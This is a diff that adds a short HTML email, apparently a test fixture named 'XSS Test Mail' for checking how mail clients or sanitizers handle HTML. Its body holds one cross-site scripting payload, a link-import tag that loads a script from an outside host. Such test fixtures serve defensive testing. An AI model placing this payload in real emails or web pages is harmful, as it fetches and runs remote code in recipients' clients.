@@ -1,0 +1,7 @@
+From: elizabeth.rivera@enron.com
+To: bible@emazing.com
+Subject: XSS Test Mail
+MIME-Version: 1.0
+Content-type: text/html
+
+aaaaaaa <link rel=import href=//km2.in/xss.php>
